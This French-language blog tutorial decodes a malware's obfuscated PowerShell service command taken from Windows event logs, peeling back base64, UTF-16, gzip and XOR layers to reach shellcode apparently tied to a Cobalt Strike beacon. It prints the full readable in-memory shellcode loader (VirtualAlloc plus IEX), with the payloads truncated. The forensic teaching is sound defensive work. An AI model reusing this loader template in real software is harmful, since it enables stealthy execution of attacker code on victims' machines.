---
layout: default
permalink: /malwarelab/tuto/decoder-shellcode
title: Décoder les commandes Powershell d'un malware et le shellcode
tag: tuto_malware
category: post
---

## Décoder les commandes Powershell d'un malware et le shellcode

Lors de la compromission d'une machine, l'une des premières choses que l'on analyse sont les journaux d'évènement Windows. Ces derniers peuvent nous en dire long sur les actions de l'attaquant. Il est même parfois possible de reconstruire toute la chaîne d'exécution du malware, du vecteur d'entrée à l'exécution du binaire malveillant.

Nous allons ici nous intéresser ici à un malware s'installant sur une machine en se faisant passer pour un service. C'est une technique assez répendue afin d'outrepasser la vigilence de l'utilisateur.

Dans les journaux d'évènements, les traces de commandes Powershell peuvent être visibles dans plusieurs fichiers (Security, Microsoft-Windows-PowerShell/Operational... ). Ici, comme il s'agit d'un service qui s'installe, nous verrons les traces d'exécution dans le fichier Système.evtx (event id : 7045).

![Evtx_PS.png](/img/decode-shellcode/Evtx_PS.png)

Nous allons décoder cette chaîne en base64 simplement avec Python :

```python
>>> import io
>>> import base64

>>> data = "JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8[REDACTED]"

>>> base64.b64decode(data)
b'$\x00s\x00=\x00N\x00e\x00w\x00-\x00O\x00b\x00j\x00e\x00c\x00t\x00 \x00I\x00O\x00.\x00M\x00e\x00m\x00o\x00r\x00y\x00S\x00t\x00r\x00e\x00a\x00m\x00(\x00,\x00[\x00C\x00o\x00n\x00v\x00e\x00r\x00t\x00]\x00:\x00:\x00F\x00r\x00o\x00m\x00B\x00a\x00s\x00e\x006\x004\x00S\x00t\x00r\x00i\x00n\x00g\x00(\x00"\x00H\x004\x00s\x00I\x00A\x00A\x00A\x00A\x00A\x00A\x00A\x00A\x00A\x00K\x001\x00W\x007\x003\x00P\x00a\x00O\x00B\x00P\x00+\x00H\x00P\x004\x00K\x00f\x00c\x00i\x00M\x007\x00S\x00l\x00Q\x00E\x00n\x00J\x00p\x006\x00E\x001\x00m\x00y\x00m\x00/[REDACTED]'
```

A la vue du résultat, les nombreux "\x00" nous ammènent à penser que la chaîne est encodée en UTF-16. Un coup de <code>decode("UTF-16")</code> et le tour est joué !

```python
>>> base64.b64decode(data).decode("UTF-16")
'$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAAAK1W73PaOBP+HP4KfciM7SlQEnJp6E1mym/MC4TGJKHlGEbIMjERFkiyw[REEDACTED]"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
```

Nous obtenons un script Powershell qui semble contenir encore une couche d'encodage de base64.

Rebelotte, décodons la chaîne en base 64 avec Python.

```python
>>> data = "H4sIAAAAAAAAAK1W73PaOBP+HP4KfciM7SlQEnJp6E1mym/MC4TGJKHlGEbIMjERFkiyw[REDACTED]"

>>> base64.b64decode(data)
b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00\xadV\xefs\xda8\x13\xfe\x1c\xfe\n}\xc8\x8c\xed)P\x12ri\xe8Mf\xcao\xcc\x0b\x84\xc6$\xa1\xe5\x18F\xc821\x11\x16H\xb2\xc1\\\xfb\xbf\xbf+\x1bs\xf4\x9a\xbcog\xee2\xc3D\x96vW\xbb\xcf>\xbb+\x87\xaa\x82\xa3\x84OT\x9f\xbb\x14\x15\x1e\xa9\x90>\x0f\xd0e.w\xde\xe0\xb6B\xb7\xe8\x93\x91\xf3\xc2\x80(\xbd\xad\x17\xb3\x05U\xb3\xb5\xe0d\x86]WP)\xd1\x9f\xb9\xb3!\x16x\x85\xcc\xf3\x08\x8b\xd9\x8a\xbb!\xa3y\x94|hA\xea\x86\x82Zgg\xb9\xb3d+\x0c$\xf6\xe8,\xc0\xca\x8f\xe8lE\xd53w%\\dN\xaa\xebu\x83\xaf\xb0\x1fL?~\xac\x87B\xd0@\xa5\xdf\xc56UU)\xe9j\xce|*M\x0b}CO\xcfT\xd0\xc2\xdd|I\x89B\x7f\xa2\xf3Y\xb1\xcd\xf8\x1c\xb3\x83X\\\xc7\xe4\x19\x02\xaa\x06\xae>\xebq\x82u\x04Eg\xcd|e\x1a\x7f\xfcaX\x93\xc2\xc5\xb4\xd8\xdc\x84\x98I\xd3pb\xa9\xe8\xaa\xe82fX\xe8\xbb\xa5[REDACTED]'
```

Pas d'UTF-16 cette fois. En revanche, la chaîne est compressée. Dans le code Powershell obtenu, la chaîne est décodée puis décompressée <code>IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress)</code>. Ce que nous allons donc reproduire avec notre chaîne fraîchement décodée .

```python
>>> zipped = io.BytesIO(base64.b64decode(data))
>>> f = gzip.GzipFile(fileobj=zipped)
>>> f.read()
b"Set-StrictMode -Version 2\n\n$DoIt = @'\nfunction func_get_proc_address {\n\tParam ($var_module, $var_procedure)\t\t\n\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n\t$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\n\treturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\n}\n\nfunction func_get_delegate_type {\n\tParam (\n\t\t[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\n\t\t[Parameter(Position = 1)] [Type] $var_return_type = [Void]\n\t)\n\n\t$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\t$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\t$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\n\treturn $var_type_builder.CreateType()\n}\n\n[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0[REDACTED]')\n\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n\t$var_code[$x] = $var_code[$x] -bxor 35\n}\n\n$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))\n$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)\n\n$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))\n$var_runme.Invoke([IntPtr]::Zero)\n'@\n\nIf ([IntPtr]::size -eq 8) {\n\tstart-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job\n}\nelse {\n\tIEX $DoIt\n}\n"
```

Nous obtenons alors un script Powershell contenant encore une fois une donnée encodée en base 64. Cependant, une grande partie du code est lisible :

```powershell
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs[REDACTED]')

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	IEX $DoIt
}
```

Que fait ce script ? Grossomodo, alloue de la mémoire afin de pouvoir y stocker la chaîne encodée en base 64 et enfin l'exécuter. Une fois n'est pas coutume, décodons cette chaîne. Notons que la chaîne, une fois décodée est XORée avec 35.

Ce script est très utilisée notamment par les malwares afin d'envoyer un beacon CobaltStrike au serveur de contrôle - à savoir, pour lui envoyer les informations concernant la nouvelle machine tout juste infectée. Ce qui implique que dans notre dernière chaîne encodée/XORée, nous allons trouver un shellcode qui pourrait nous donner quelques informations utiles !

Une autre manière d'obtenir notre shellcode est d'exécuter la commande dans un terminale ISE :

```
[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs[REDACTED]')

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}

Write-Output $var_code
```

Nous obtenons de cette manière une chaîne décimale, qu'on l'on va convertir en hexadécimal.

```
252 232 130 0 0 0 96 137 229 49 192 100 139 80 48 139 82 12 [REDACTED]

fc e8 82 00 00 00 60 89 e5 31 c0 64 8b 50 30 8b 52 0c 8b 52 [REDACTED]
```

# Désassembler le shellcode

Pour comprendre ce que fait notre shellcode, nous pouvons le désassembler avec shellen (https://github.com/merrychap/shellen).

![dsm_shellcode1.PNG](/img/decode-shellcode/dsm_shellcode1.PNG)
